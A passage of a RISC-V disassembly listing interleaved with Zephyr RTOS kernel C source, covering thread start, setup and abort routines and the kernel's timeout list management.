}
80044b8a:	8905                	andi	a0,a0,1
80044b8c:	8082                	ret

80044b8e <z_impl_k_thread_start>:
}
#endif

#ifdef CONFIG_MULTITHREADING
void z_impl_k_thread_start(struct k_thread *thread)
{
80044b8e:	1141                	addi	sp,sp,-16
80044b90:	c606                	sw	ra,12(sp)
80044b92:	c422                	sw	s0,8(sp)
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044b94:	4421                	li	s0,8
80044b96:	30043473          	csrrc	s0,mstatus,s0
	key = (mstatus & SOC_MSTATUS_IEN);
80044b9a:	8821                	andi	s0,s0,8
	return (thread->base.thread_state & _THREAD_PRESTART) == 0U;
80044b9c:	00d54783          	lbu	a5,13(a0)
	k_spinlock_key_t key = k_spin_lock(&lock); /* protect kernel queues */

	if (z_has_thread_started(thread)) {
80044ba0:	0047f713          	andi	a4,a5,4
80044ba4:	cb19                	beqz	a4,80044bba <z_impl_k_thread_start+0x2c>
	thread->base.thread_state &= ~_THREAD_PRESTART;
80044ba6:	0fb7f793          	andi	a5,a5,251
80044baa:	00f506a3          	sb	a5,13(a0)
	return !((z_is_thread_prevented_from_running(thread)) != 0 ||
80044bae:	8bed                	andi	a5,a5,27
80044bb0:	eb91                	bnez	a5,80044bc4 <z_impl_k_thread_start+0x36>
	return node->next != NULL;
80044bb2:	4d1c                	lw	a5,24(a0)
80044bb4:	c791                	beqz	a5,80044bc0 <z_impl_k_thread_start+0x32>
80044bb6:	4781                	li	a5,0
80044bb8:	a039                	j	80044bc6 <z_impl_k_thread_start+0x38>
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044bba:	30042473          	csrrs	s0,mstatus,s0
		k_spin_unlock(&lock, key);
		return;
80044bbe:	a821                	j	80044bd6 <z_impl_k_thread_start+0x48>
80044bc0:	4785                	li	a5,1
80044bc2:	a011                	j	80044bc6 <z_impl_k_thread_start+0x38>
80044bc4:	4781                	li	a5,0
	if (z_is_thread_ready(thread)) {
80044bc6:	ef81                	bnez	a5,80044bde <z_impl_k_thread_start+0x50>
	}

	z_mark_thread_as_started(thread);
	z_ready_thread(thread);
	z_reschedule(&lock, key);
80044bc8:	85a2                	mv	a1,s0
80044bca:	80047537          	lui	a0,0x80047
80044bce:	27450513          	addi	a0,a0,628 # 80047274 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047275>
80044bd2:	b2dff0ef          	jal	ra,800446fe <z_reschedule>
}
80044bd6:	40b2                	lw	ra,12(sp)
80044bd8:	4422                	lw	s0,8(sp)
80044bda:	0141                	addi	sp,sp,16
80044bdc:	8082                	ret
		z_add_thread_to_ready_q(thread);
80044bde:	cbbff0ef          	jal	ra,80044898 <z_add_thread_to_ready_q>
80044be2:	b7dd                	j	80044bc8 <z_impl_k_thread_start+0x3a>

80044be4 <schedule_new_thread>:
#endif
#endif

#ifdef CONFIG_MULTITHREADING
static void schedule_new_thread(struct k_thread *thread, s32_t delay)
{
80044be4:	1141                	addi	sp,sp,-16
80044be6:	c606                	sw	ra,12(sp)
#ifdef CONFIG_SYS_CLOCK_EXISTS
	if (delay == 0) {
80044be8:	e589                	bnez	a1,80044bf2 <schedule_new_thread+0xe>

K_SYSCALL_DECLARE1_VOID(K_SYSCALL_K_THREAD_START, k_thread_start, k_tid_t, thread)
80044bea:	3755                	jal	80044b8e <z_impl_k_thread_start>
	}
#else
	ARG_UNUSED(delay);
	k_thread_start(thread);
#endif
}
80044bec:	40b2                	lw	ra,12(sp)
80044bee:	0141                	addi	sp,sp,16
80044bf0:	8082                	ret
80044bf2:	05a5                	addi	a1,a1,9
80044bf4:	4629                	li	a2,10
80044bf6:	02c5c633          	div	a2,a1,a2

extern void z_thread_timeout(struct _timeout *to);

static inline void z_add_thread_timeout(struct k_thread *th, s32_t ticks)
{
	z_add_timeout(&th->base.timeout, z_thread_timeout, ticks);
80044bfa:	0605                	addi	a2,a2,1
80044bfc:	800455b7          	lui	a1,0x80045
80044c00:	93458593          	addi	a1,a1,-1740 # 80044934 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80044935>
80044c04:	0561                	addi	a0,a0,24
80044c06:	2411                	jal	80044e0a <z_add_timeout>
80044c08:	b7d5                	j	80044bec <schedule_new_thread+0x8>

80044c0a <z_setup_new_thread>:
void z_setup_new_thread(struct k_thread *new_thread,
		       k_thread_stack_t *stack, size_t stack_size,
		       k_thread_entry_t entry,
		       void *p1, void *p2, void *p3,
		       int prio, u32_t options, const char *name)
{
80044c0a:	1101                	addi	sp,sp,-32
80044c0c:	ce06                	sw	ra,28(sp)
80044c0e:	cc22                	sw	s0,24(sp)
80044c10:	842a                	mv	s0,a0
	stack_size = STACK_ROUND_DOWN(stack_size
			- sizeof(*new_thread->userspace_local_data));
#endif
#endif

	z_new_thread(new_thread, stack, stack_size, entry, p1, p2, p3,
80044c12:	5302                	lw	t1,32(sp)
80044c14:	c01a                	sw	t1,0(sp)
80044c16:	e7ffe0ef          	jal	ra,80043a94 <z_new_thread>
	}
#endif
#ifdef CONFIG_SCHED_DEADLINE
	new_thread->base.prio_deadline = 0;
#endif
	new_thread->resource_pool = _current->resource_pool;
80044c1a:	800477b7          	lui	a5,0x80047
80044c1e:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044c22:	479c                	lw	a5,8(a5)
80044c24:	57bc                	lw	a5,104(a5)
80044c26:	d43c                	sw	a5,104(s0)
	sys_trace_thread_create(new_thread);
}
80044c28:	40f2                	lw	ra,28(sp)
80044c2a:	4462                	lw	s0,24(sp)
80044c2c:	6105                	addi	sp,sp,32
80044c2e:	8082                	ret

80044c30 <z_thread_single_abort>:
#ifdef CONFIG_USERSPACE
Z_SYSCALL_HANDLER1_SIMPLE_VOID(k_thread_resume, K_OBJ_THREAD, k_tid_t);
#endif

void z_thread_single_abort(struct k_thread *thread)
{
80044c30:	1141                	addi	sp,sp,-16
80044c32:	c606                	sw	ra,12(sp)
80044c34:	c422                	sw	s0,8(sp)
80044c36:	842a                	mv	s0,a0
	if (thread->fn_abort != NULL) {
80044c38:	513c                	lw	a5,96(a0)
80044c3a:	c391                	beqz	a5,80044c3e <z_thread_single_abort+0xe>
		thread->fn_abort();
80044c3c:	9782                	jalr	a5
	u8_t state = thread->base.thread_state;
80044c3e:	00d44783          	lbu	a5,13(s0)
	return !((z_is_thread_prevented_from_running(thread)) != 0 ||
80044c42:	01f7f713          	andi	a4,a5,31
80044c46:	e719                	bnez	a4,80044c54 <z_thread_single_abort+0x24>
80044c48:	4c18                	lw	a4,24(s0)
80044c4a:	c319                	beqz	a4,80044c50 <z_thread_single_abort+0x20>
80044c4c:	4701                	li	a4,0
80044c4e:	a021                	j	80044c56 <z_thread_single_abort+0x26>
80044c50:	4705                	li	a4,1
80044c52:	a011                	j	80044c56 <z_thread_single_abort+0x26>
80044c54:	4701                	li	a4,0

	if (IS_ENABLED(CONFIG_SMP)) {
		z_sched_abort(thread);
	}

	if (z_is_thread_ready(thread)) {
80044c56:	e315                	bnez	a4,80044c7a <z_thread_single_abort+0x4a>
		z_remove_thread_from_ready_q(thread);
	} else {
		if (z_is_thread_pending(thread)) {
80044c58:	8b89                	andi	a5,a5,2
80044c5a:	e39d                	bnez	a5,80044c80 <z_thread_single_abort+0x50>
80044c5c:	4c1c                	lw	a5,24(s0)
			z_unpend_thread_no_timeout(thread);
		}
		if (z_is_thread_timeout_active(thread)) {
80044c5e:	c781                	beqz	a5,80044c66 <z_thread_single_abort+0x36>
}

static inline int z_abort_thread_timeout(struct k_thread *thread)
{
	return z_abort_timeout(&thread->base.timeout);
80044c60:	01840513          	addi	a0,s0,24
80044c64:	2c15                	jal	80044e98 <z_abort_timeout>
			(void)z_abort_thread_timeout(thread);
		}
	}

	thread->base.thread_state |= _THREAD_DEAD;
80044c66:	00d44783          	lbu	a5,13(s0)
80044c6a:	0087e793          	ori	a5,a5,8
80044c6e:	00f406a3          	sb	a5,13(s0)
	z_object_uninit(thread);

	/* Revoke permissions on thread's ID so that it may be recycled */
	z_thread_perms_all_clear(thread);
#endif
}
80044c72:	40b2                	lw	ra,12(sp)
80044c74:	4422                	lw	s0,8(sp)
80044c76:	0141                	addi	sp,sp,16
80044c78:	8082                	ret
		z_remove_thread_from_ready_q(thread);
80044c7a:	8522                	mv	a0,s0
80044c7c:	3da9                	jal	80044ad6 <z_remove_thread_from_ready_q>
80044c7e:	b7e5                	j	80044c66 <z_thread_single_abort+0x36>
			z_unpend_thread_no_timeout(thread);
80044c80:	8522                	mv	a0,s0
80044c82:	a3bff0ef          	jal	ra,800446bc <z_unpend_thread_no_timeout>
80044c86:	bfd9                	j	80044c5c <z_thread_single_abort+0x2c>

80044c88 <z_init_static_threads>:
	}
}
#endif /* CONFIG_USERSPACE */

void z_init_static_threads(void)
{
80044c88:	1101                	addi	sp,sp,-32
80044c8a:	ce06                	sw	ra,28(sp)
80044c8c:	cc22                	sw	s0,24(sp)
	_FOREACH_STATIC_THREAD(thread_data) {
80044c8e:	80047437          	lui	s0,0x80047
80044c92:	d7440413          	addi	s0,s0,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80044c96:	800477b7          	lui	a5,0x80047
80044c9a:	d7478793          	addi	a5,a5,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80044c9e:	02f47663          	bgeu	s0,a5,80044cca <z_init_static_threads+0x42>
		z_setup_new_thread(
80044ca2:	545c                	lw	a5,44(s0)
80044ca4:	c23e                	sw	a5,4(sp)
80044ca6:	501c                	lw	a5,32(s0)
80044ca8:	c03e                	sw	a5,0(sp)
80044caa:	01c42883          	lw	a7,28(s0)
80044cae:	01842803          	lw	a6,24(s0)
80044cb2:	485c                	lw	a5,20(s0)
80044cb4:	4818                	lw	a4,16(s0)
80044cb6:	4454                	lw	a3,12(s0)
80044cb8:	4410                	lw	a2,8(s0)
80044cba:	404c                	lw	a1,4(s0)
80044cbc:	4008                	lw	a0,0(s0)
80044cbe:	37b1                	jal	80044c0a <z_setup_new_thread>
			thread_data->init_p3,
			thread_data->init_prio,
			thread_data->init_options,
			thread_data->init_name);

		thread_data->init_thread->init_data = thread_data;
80044cc0:	401c                	lw	a5,0(s0)
80044cc2:	cfe0                	sw	s0,92(a5)
	_FOREACH_STATIC_THREAD(thread_data) {
80044cc4:	03040413          	addi	s0,s0,48
80044cc8:	b7f9                	j	80044c96 <z_init_static_threads+0xe>
	 * until they are all started.
	 *
	 * Note that static threads defined using the legacy API have a
	 * delay of K_FOREVER.
	 */
	k_sched_lock();
80044cca:	a77ff0ef          	jal	ra,80044740 <k_sched_lock>
	_FOREACH_STATIC_THREAD(thread_data) {
80044cce:	80047437          	lui	s0,0x80047
80044cd2:	d7440413          	addi	s0,s0,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80044cd6:	a029                	j	80044ce0 <z_init_static_threads+0x58>
		if (thread_data->init_delay != K_FOREVER) {
			schedule_new_thread(thread_data->init_thread,
80044cd8:	4008                	lw	a0,0(s0)
80044cda:	3729                	jal	80044be4 <schedule_new_thread>
	_FOREACH_STATIC_THREAD(thread_data) {
80044cdc:	03040413          	addi	s0,s0,48
80044ce0:	800477b7          	lui	a5,0x80047
80044ce4:	d7478793          	addi	a5,a5,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80044ce8:	00f47763          	bgeu	s0,a5,80044cf6 <z_init_static_threads+0x6e>
		if (thread_data->init_delay != K_FOREVER) {
80044cec:	504c                	lw	a1,36(s0)
80044cee:	57fd                	li	a5,-1
80044cf0:	fef586e3          	beq	a1,a5,80044cdc <z_init_static_threads+0x54>
80044cf4:	b7d5                	j	80044cd8 <z_init_static_threads+0x50>
					    thread_data->init_delay);
		}
	}
	k_sched_unlock();
80044cf6:	b39ff0ef          	jal	ra,8004482e <k_sched_unlock>
}
80044cfa:	40f2                	lw	ra,28(sp)
80044cfc:	4462                	lw	s0,24(sp)
80044cfe:	6105                	addi	sp,sp,32
80044d00:	8082                	ret

80044d02 <z_init_thread_base>:
void z_init_thread_base(struct _thread_base *thread_base, int priority,
		       u32_t initial_state, unsigned int options)
{
	/* k_q_node is initialized upon first insertion in a list */

	thread_base->user_options = (u8_t)options;
80044d02:	00d50623          	sb	a3,12(a0)
	thread_base->thread_state = (u8_t)initial_state;
80044d06:	00c506a3          	sb	a2,13(a0)

	thread_base->prio = priority;
80044d0a:	00b50723          	sb	a1,14(a0)

	thread_base->sched_locked = 0U;
80044d0e:	000507a3          	sb	zero,15(a0)
	node->next = NULL;
80044d12:	00052c23          	sw	zero,24(a0)
	node->prev = NULL;
80044d16:	00052e23          	sw	zero,28(a0)

	/* swap_data does not need to be initialized */

	z_init_thread_timeout(thread_base);
}
80044d1a:	8082                	ret

80044d1c <z_impl_k_thread_abort>:

extern void z_thread_single_abort(struct k_thread *thread);

#if !defined(CONFIG_ARCH_HAS_THREAD_ABORT)
void z_impl_k_thread_abort(k_tid_t thread)
{
80044d1c:	1141                	addi	sp,sp,-16
80044d1e:	c606                	sw	ra,12(sp)
80044d20:	c422                	sw	s0,8(sp)
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044d22:	4421                	li	s0,8
80044d24:	30043473          	csrrc	s0,mstatus,s0
	key = (mstatus & SOC_MSTATUS_IEN);
80044d28:	8821                	andi	s0,s0,8
	k_spinlock_key_t key = k_spin_lock(&lock);

	__ASSERT((thread->base.user_options & K_ESSENTIAL) == 0U,
		 "essential thread aborted");

	z_thread_single_abort(thread);
80044d2a:	3719                	jal	80044c30 <z_thread_single_abort>
	z_thread_monitor_exit(thread);

	z_reschedule(&lock, key);
80044d2c:	85a2                	mv	a1,s0
80044d2e:	850a                	mv	a0,sp
80044d30:	9cfff0ef          	jal	ra,800446fe <z_reschedule>
}
80044d34:	40b2                	lw	ra,12(sp)
80044d36:	4422                	lw	s0,8(sp)
80044d38:	0141                	addi	sp,sp,16
80044d3a:	8082                	ret

80044d3c <first>:
	return list->head == list;
80044d3c:	800477b7          	lui	a5,0x80047
80044d40:	d2878793          	addi	a5,a5,-728 # 80046d28 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d29>
80044d44:	4388                	lw	a0,0(a5)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80044d46:	00f50363          	beq	a0,a5,80044d4c <first+0x10>
static struct _timeout *first(void)
{
	sys_dnode_t *t = sys_dlist_peek_head(&timeout_list);

	return t == NULL ? NULL : CONTAINER_OF(t, struct _timeout, node);
}
80044d4a:	8082                	ret
80044d4c:	4501                	li	a0,0
	return t == NULL ? NULL : CONTAINER_OF(t, struct _timeout, node);
80044d4e:	bff5                	j	80044d4a <first+0xe>

80044d50 <next>:
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80044d50:	c919                	beqz	a0,80044d66 <next+0x16>
	return (node == list->tail) ? NULL : node->next;
80044d52:	80047737          	lui	a4,0x80047
80044d56:	d2870713          	addi	a4,a4,-728 # 80046d28 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d29>
80044d5a:	4358                	lw	a4,4(a4)
80044d5c:	00e50463          	beq	a0,a4,80044d64 <next+0x14>
80044d60:	4108                	lw	a0,0(a0)
80044d62:	8082                	ret
80044d64:	4501                	li	a0,0
static struct _timeout *next(struct _timeout *t)
{
	sys_dnode_t *n = sys_dlist_peek_next(&timeout_list, &t->node);

	return n == NULL ? NULL : CONTAINER_OF(n, struct _timeout, node);
}
80044d66:	8082                	ret

80044d68 <remove_timeout>:

static void remove_timeout(struct _timeout *t)
{
80044d68:	1141                	addi	sp,sp,-16
80044d6a:	c606                	sw	ra,12(sp)
80044d6c:	c422                	sw	s0,8(sp)
80044d6e:	842a                	mv	s0,a0
	if (next(t) != NULL) {
80044d70:	37c5                	jal	80044d50 <next>
80044d72:	c509                	beqz	a0,80044d7c <remove_timeout+0x14>
		next(t)->dticks += t->dticks;
80044d74:	4418                	lw	a4,8(s0)
80044d76:	451c                	lw	a5,8(a0)
80044d78:	97ba                	add	a5,a5,a4
80044d7a:	c51c                	sw	a5,8(a0)
	node->prev->next = node->next;
80044d7c:	4058                	lw	a4,4(s0)
80044d7e:	401c                	lw	a5,0(s0)
80044d80:	c31c                	sw	a5,0(a4)
	node->next->prev = node->prev;
80044d82:	4058                	lw	a4,4(s0)
80044d84:	c3d8                	sw	a4,4(a5)
	node->next = NULL;
80044d86:	00042023          	sw	zero,0(s0)
	node->prev = NULL;
80044d8a:	00042223          	sw	zero,4(s0)
	}

	sys_dlist_remove(&t->node);
}
80044d8e:	40b2                	lw	ra,12(sp)
80044d90:	4422                	lw	s0,8(sp)
80044d92:	0141                	addi	sp,sp,16
80044d94:	8082                	ret

80044d96 <elapsed>:

static s32_t elapsed(void)
{
	return announce_remaining == 0 ? z_clock_elapsed() : 0;
80044d96:	800477b7          	lui	a5,0x80047
80044d9a:	dc87a783          	lw	a5,-568(a5) # 80046dc8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc9>
80044d9e:	c399                	beqz	a5,80044da4 <elapsed+0xe>
80044da0:	4501                	li	a0,0
}
80044da2:	8082                	ret
{
80044da4:	1141                	addi	sp,sp,-16
80044da6:	c606                	sw	ra,12(sp)
	return announce_remaining == 0 ? z_clock_elapsed() : 0;
80044da8:	d00ff0ef          	jal	ra,800442a8 <z_clock_elapsed>
}
80044dac:	40b2                	lw	ra,12(sp)
80044dae:	0141                	addi	sp,sp,16
80044db0:	8082                	ret

80044db2 <next_timeout>:

static s32_t next_timeout(void)
{
80044db2:	1141                	addi	sp,sp,-16
80044db4:	c606                	sw	ra,12(sp)
80044db6:	c422                	sw	s0,8(sp)
80044db8:	c226                	sw	s1,4(sp)
	int maxw = can_wait_forever ? K_FOREVER : INT_MAX;
80044dba:	800477b7          	lui	a5,0x80047
80044dbe:	dcc7c783          	lbu	a5,-564(a5) # 80046dcc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dcd>
80044dc2:	cb9d                	beqz	a5,80044df8 <next_timeout+0x46>
80044dc4:	547d                	li	s0,-1
	struct _timeout *to = first();
80044dc6:	3f9d                	jal	80044d3c <first>
80044dc8:	84aa                	mv	s1,a0
	s32_t ret = to == NULL ? maxw : MAX(0, to->dticks - elapsed());
80044dca:	c901                	beqz	a0,80044dda <next_timeout+0x28>
80044dcc:	4500                	lw	s0,8(a0)
80044dce:	37e1                	jal	80044d96 <elapsed>
80044dd0:	40a40533          	sub	a0,s0,a0
80044dd4:	02055763          	bgez	a0,80044e02 <next_timeout+0x50>
80044dd8:	4401                	li	s0,0

#ifdef CONFIG_TIMESLICING
	if (_current_cpu->slice_ticks && _current_cpu->slice_ticks < ret) {
80044dda:	800477b7          	lui	a5,0x80047
80044dde:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044de2:	4b9c                	lw	a5,16(a5)
80044de4:	c781                	beqz	a5,80044dec <next_timeout+0x3a>
80044de6:	0087d363          	bge	a5,s0,80044dec <next_timeout+0x3a>
		ret = _current_cpu->slice_ticks;
80044dea:	843e                	mv	s0,a5
	}
#endif
	return ret;
}
80044dec:	8522                	mv	a0,s0
80044dee:	40b2                	lw	ra,12(sp)
80044df0:	4422                	lw	s0,8(sp)
80044df2:	4492                	lw	s1,4(sp)
80044df4:	0141                	addi	sp,sp,16
80044df6:	8082                	ret
	int maxw = can_wait_forever ? K_FOREVER : INT_MAX;
80044df8:	80000437          	lui	s0,0x80000
80044dfc:	fff44413          	not	s0,s0
80044e00:	b7d9                	j	80044dc6 <next_timeout+0x14>
	s32_t ret = to == NULL ? maxw : MAX(0, to->dticks - elapsed());
80044e02:	4480                	lw	s0,8(s1)
80044e04:	3f49                	jal	80044d96 <elapsed>
80044e06:	8c09                	sub	s0,s0,a0
80044e08:	bfc9                	j	80044dda <next_timeout+0x28>

80044e0a <z_add_timeout>:

void z_add_timeout(struct _timeout *to, _timeout_func_t fn, s32_t ticks)
{
80044e0a:	1141                	addi	sp,sp,-16
80044e0c:	c606                	sw	ra,12(sp)
80044e0e:	c422                	sw	s0,8(sp)
80044e10:	c226                	sw	s1,4(sp)
80044e12:	c04a                	sw	s2,0(sp)
80044e14:	842a                	mv	s0,a0
	__ASSERT(!sys_dnode_is_linked(&to->node), "");
	to->fn = fn;
80044e16:	c54c                	sw	a1,12(a0)
	ticks = MAX(1, ticks);
80044e18:	8932                	mv	s2,a2
80044e1a:	00c05863          	blez	a2,80044e2a <z_add_timeout+0x20>

	LOCKED(&timeout_lock) {
80044e1e:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044e20:	44a1                	li	s1,8
80044e22:	3004b4f3          	csrrc	s1,mstatus,s1
80044e26:	88a1                	andi	s1,s1,8
80044e28:	a02d                	j	80044e52 <z_add_timeout+0x48>
	ticks = MAX(1, ticks);
80044e2a:	4905                	li	s2,1
80044e2c:	bfcd                	j	80044e1e <z_add_timeout+0x14>
		to->dticks = ticks + elapsed();
		for (t = first(); t != NULL; t = next(t)) {
			__ASSERT(t->dticks >= 0, "");

			if (t->dticks > to->dticks) {
				t->dticks -= to->dticks;
80044e2e:	40f707b3          	sub	a5,a4,a5
80044e32:	c51c                	sw	a5,8(a0)
	node->prev = successor->prev;
80044e34:	415c                	lw	a5,4(a0)
80044e36:	c05c                	sw	a5,4(s0)
	node->next = successor;
80044e38:	c008                	sw	a0,0(s0)
	successor->prev->next = node;
80044e3a:	415c                	lw	a5,4(a0)
80044e3c:	c380                	sw	s0,0(a5)
	successor->prev = node;
80044e3e:	c140                	sw	s0,4(a0)
				break;
			}
			to->dticks -= t->dticks;
		}

		if (t == NULL) {
80044e40:	c51d                	beqz	a0,80044e6e <z_add_timeout+0x64>
			sys_dlist_append(&timeout_list, &to->node);
		}

		if (to == first()) {
80044e42:	3ded                	jal	80044d3c <first>
80044e44:	02a40f63          	beq	s0,a0,80044e82 <z_add_timeout+0x78>
			  : "r" (key & SOC_MSTATUS_IEN)
80044e48:	0084f793          	andi	a5,s1,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044e4c:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&timeout_lock) {
80044e50:	4785                	li	a5,1
80044e52:	ef8d                	bnez	a5,80044e8c <z_add_timeout+0x82>
		to->dticks = ticks + elapsed();
80044e54:	3789                	jal	80044d96 <elapsed>
80044e56:	954a                	add	a0,a0,s2
80044e58:	c408                	sw	a0,8(s0)
		for (t = first(); t != NULL; t = next(t)) {
80044e5a:	35cd                	jal	80044d3c <first>
80044e5c:	d175                	beqz	a0,80044e40 <z_add_timeout+0x36>
			if (t->dticks > to->dticks) {
80044e5e:	4518                	lw	a4,8(a0)
80044e60:	441c                	lw	a5,8(s0)
80044e62:	fce7c6e3          	blt	a5,a4,80044e2e <z_add_timeout+0x24>
			to->dticks -= t->dticks;
80044e66:	8f99                	sub	a5,a5,a4
80044e68:	c41c                	sw	a5,8(s0)
		for (t = first(); t != NULL; t = next(t)) {
80044e6a:	35dd                	jal	80044d50 <next>
80044e6c:	bfc5                	j	80044e5c <z_add_timeout+0x52>
	node->next = list;
80044e6e:	800477b7          	lui	a5,0x80047
80044e72:	d2878793          	addi	a5,a5,-728 # 80046d28 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d29>
80044e76:	c01c                	sw	a5,0(s0)
	node->prev = list->tail;
80044e78:	43d8                	lw	a4,4(a5)
80044e7a:	c058                	sw	a4,4(s0)
	list->tail->next = node;
80044e7c:	c300                	sw	s0,0(a4)
	list->tail = node;
80044e7e:	c3c0                	sw	s0,4(a5)
80044e80:	b7c9                	j	80044e42 <z_add_timeout+0x38>
			z_clock_set_timeout(next_timeout(), false);
80044e82:	3f05                	jal	80044db2 <next_timeout>
80044e84:	4581                	li	a1,0
80044e86:	b8eff0ef          	jal	ra,80044214 <z_clock_set_timeout>
80044e8a:	bf7d                	j	80044e48 <z_add_timeout+0x3e>
		}
	}
}
80044e8c:	40b2                	lw	ra,12(sp)
80044e8e:	4422                	lw	s0,8(sp)
80044e90:	4492                	lw	s1,4(sp)
80044e92:	4902                	lw	s2,0(sp)
80044e94:	0141                	addi	sp,sp,16
80044e96:	8082                	ret

80044e98 <z_abort_timeout>:

int z_abort_timeout(struct _timeout *to)
{
80044e98:	1141                	addi	sp,sp,-16
80044e9a:	c606                	sw	ra,12(sp)
80044e9c:	c422                	sw	s0,8(sp)
80044e9e:	c226                	sw	s1,4(sp)
80044ea0:	c04a                	sw	s2,0(sp)
80044ea2:	84aa                	mv	s1,a0
	int ret = -EINVAL;

	LOCKED(&timeout_lock) {
80044ea4:	4401                	li	s0,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044ea6:	4921                	li	s2,8
80044ea8:	30093973          	csrrc	s2,mstatus,s2
80044eac:	00897913          	andi	s2,s2,8
	int ret = -EINVAL;
80044eb0:	5529                	li	a0,-22
80044eb2:	a809                	j	80044ec4 <z_abort_timeout+0x2c>
		if (sys_dnode_is_linked(&to->node)) {
			remove_timeout(to);
80044eb4:	8526                	mv	a0,s1
80044eb6:	3d4d                	jal	80044d68 <remove_timeout>
			ret = 0;
80044eb8:	8522                	mv	a0,s0
			  : "r" (key & SOC_MSTATUS_IEN)
80044eba:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044ebe:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&timeout_lock) {
80044ec2:	4405                	li	s0,1
80044ec4:	e401                	bnez	s0,80044ecc <z_abort_timeout+0x34>
	return node->next != NULL;
80044ec6:	409c                	lw	a5,0(s1)
		if (sys_dnode_is_linked(&to->node)) {
80044ec8:	f7f5                	bnez	a5,80044eb4 <z_abort_timeout+0x1c>
80044eca:	bfc5                	j	80044eba <z_abort_timeout+0x22>
		}
	}

	return ret;
}
80044ecc:	40b2                	lw	ra,12(sp)
80044ece:	4422                	lw	s0,8(sp)
80044ed0:	4492                	lw	s1,4(sp)
80044ed2:	4902                	lw	s2,0(sp)
80044ed4:	0141                	addi	sp,sp,16
80044ed6:	8082                	ret

80044ed8 <z_get_next_timeout_expiry>:

	return ticks - elapsed();
}

s32_t z_get_next_timeout_expiry(void)
{
80044ed8:	1141                	addi	sp,sp,-16
80044eda:	c606                	sw	ra,12(sp)
80044edc:	c422                	sw	s0,8(sp)
	s32_t ret = K_FOREVER;

	LOCKED(&timeout_lock) {
80044ede:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044ee0:	4421                	li	s0,8
80044ee2:	30043473          	csrrc	s0,mstatus,s0
80044ee6:	8821                	andi	s0,s0,8
	s32_t ret = K_FOREVER;
80044ee8:	557d                	li	a0,-1
	LOCKED(&timeout_lock) {
80044eea:	eb81                	bnez	a5,80044efa <z_get_next_timeout_expiry+0x22>
		ret = next_timeout();
80044eec:	35d9                	jal	80044db2 <next_timeout>
			  : "r" (key & SOC_MSTATUS_IEN)
80044eee:	00847793          	andi	a5,s0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044ef2:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&timeout_lock) {
80044ef6:	4785                	li	a5,1
80044ef8:	bfcd                	j	80044eea <z_get_next_timeout_expiry+0x12>
	}
	return ret;
}
80044efa:	40b2                	lw	ra,12(sp)
80044efc:	4422                	lw	s0,8(sp)
80044efe:	0141                	addi	sp,sp,16
80044f00:	8082                	ret

80044f02 <z_set_timeout_expiry>:

void z_set_timeout_expiry(s32_t ticks, bool idle)
{
80044f02:	1101                	addi	sp,sp,-32
80044f04:	ce06                	sw	ra,28(sp)
80044f06:	cc22                	sw	s0,24(sp)
80044f08:	ca26                	sw	s1,20(sp)
80044f0a:	c84a                	sw	s2,16(sp)
80044f0c:	c64e                	sw	s3,12(sp)
80044f0e:	892a                	mv	s2,a0
80044f10:	89ae                	mv	s3,a1
	LOCKED(&timeout_lock) {
80044f12:	4401                	li	s0,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044f14:	44a1                	li	s1,8
80044f16:	3004b4f3          	csrrc	s1,mstatus,s1
80044f1a:	88a1                	andi	s1,s1,8
80044f1c:	a821                	j	80044f34 <z_set_timeout_expiry+0x32>
		int next = next_timeout();
		bool sooner = (next == K_FOREVER) || (ticks < next);
80044f1e:	4405                	li	s0,1
80044f20:	8805                	andi	s0,s0,1
		 * what we have.  Also don't try to set a timeout when
		 * one is about to expire: drivers have internal logic
		 * that will bump the timeout to the "next" tick if
		 * it's not considered to be settable as directed.
		 */
		if (sooner && !imminent) {
80044f22:	c401                	beqz	s0,80044f2a <z_set_timeout_expiry+0x28>
80044f24:	4785                	li	a5,1
80044f26:	02a7c063          	blt	a5,a0,80044f46 <z_set_timeout_expiry+0x44>
			  : "r" (key & SOC_MSTATUS_IEN)
80044f2a:	0084f793          	andi	a5,s1,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044f2e:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&timeout_lock) {
80044f32:	4405                	li	s0,1
80044f34:	ec11                	bnez	s0,80044f50 <z_set_timeout_expiry+0x4e>
		int next = next_timeout();
80044f36:	3db5                	jal	80044db2 <next_timeout>
		bool sooner = (next == K_FOREVER) || (ticks < next);
80044f38:	57fd                	li	a5,-1
80044f3a:	fef502e3          	beq	a0,a5,80044f1e <z_set_timeout_expiry+0x1c>
80044f3e:	fea951e3          	bge	s2,a0,80044f20 <z_set_timeout_expiry+0x1e>
80044f42:	4405                	li	s0,1
